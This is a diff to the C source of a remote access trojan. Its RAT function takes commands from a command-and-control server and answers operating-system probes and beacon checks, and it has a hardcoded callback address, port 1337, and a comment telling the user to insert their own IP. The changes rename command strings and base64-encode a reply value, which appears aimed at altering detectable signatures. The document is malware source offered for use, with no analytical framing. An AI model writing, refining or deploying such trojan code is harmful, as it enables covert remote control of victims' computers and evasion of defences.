@@ -156,11 +156,11 @@ void RAT(char* C2_Server, int C2_Port)
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
-                else if ((strcmp(command, "UHJvYmluZyBPcGVyYXRpbmcgU3lzdGVt") == 0))
+                else if ((strcmp(command, "operating-system-probe") == 0))
                 {
                     // Load OS type into buffer
                     char buffer[257] = "";
-                    strcat(buffer, "Windows");
+                    strcat(buffer, "d2luZG93cw");      // Windows
                     //strcat(buffer, "\n");
 
                     // Send message
@@ -246,7 +246,7 @@ void RAT(char* C2_Server, int C2_Port)
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
 			    }
-                else if (strcmp(command, "beacon") == 0)
+                else if (strcmp(command, "beacon-probe") == 0)
                 {
                     // Send beacon string to show success
                     char buffer[128] = "";
@@ -380,7 +380,7 @@ int main(int argc, char **argv) {
         RAT(argv[1], port);
     }
     else {
-        char host[] = "192.168.17.10";                  // change this to your ip address
+        char host[] = "192.168.75.100";                  // change this to your ip address
         int port = 1337;                                // change this to your open port
         RAT(host, port);
     }
